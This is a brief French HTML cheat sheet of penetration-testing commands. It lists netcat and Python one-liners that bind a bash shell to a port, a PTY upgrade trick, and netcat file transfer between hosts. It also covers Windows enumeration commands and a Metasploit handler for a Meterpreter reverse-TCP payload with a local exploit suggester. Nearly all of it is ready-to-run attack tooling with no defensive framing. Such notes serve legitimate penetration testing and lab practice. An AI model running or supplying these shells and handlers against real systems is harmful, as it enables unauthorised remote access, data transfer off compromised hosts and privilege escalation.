<h2>Unix</h2>
Accorder les permissions pour un user specifique</br>
setfacl -m u:username:rwx myfolder</br>
Tunnel ssh dynamique sur le port local 8080:</br>
ssh -ND 8080 root@addressIP</br>
<h3>Obtenir un shell</h3>
Ouvrent un shell sur le port 2222 :
<ul>
  <li>nc -lvp 2222 -e /bin/bash</li>
  <li>python -c "import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.bind(('',2222));s.listen(1);conn,addr=s.accept();os.dup2(conn.fileno(),0);os.dup2(conn.fileno(),1);os.dup2(conn.fileno(),2);p=subprocess.call(['/bin/bash','-i'])"</li>
</ul>
On se connecte avec nc -nv 2222 adress port</br>
Pour avoir un shell tty :</br>
python -c "import pty; pty.spawn('/bin/bash')"</br>
Pour avoir tab completion tout joli :</br>
CTRL-Z</br>
stty echo -raw</br>
fg</br>


Envoi fichier avec netcat :</br>
nc -l -p 1234 > out.file</br>
nc -w 3 [destination] 1234 < out.file</br>

<h2>Windows</h2>
systeminfo pour obtenir des renseignements sur le systeme</br>
net users [username] pour obtenir des renseignements sur les utilisateurs</br>
tasklist pour lister les processus</br>
netstat -ano pour les connexions reseau</br>
dir sysprep /s /b pour trouver un fichier dans le repertoire courant et ses sous-dossiers</br>


<h2>Metasploit</h2>
Handler :</br>
use exploit/multi/handler</br>
set PAYLOAD windows/x64/meterpreter/reverse_tcp</br>
set LHOST 192.168.8.142</br>
set LPORT 8888</br>
set ExitOnSession false</br>
exploit -j -z</br>

use post/multi/recon/local_exploit_suggester</br>
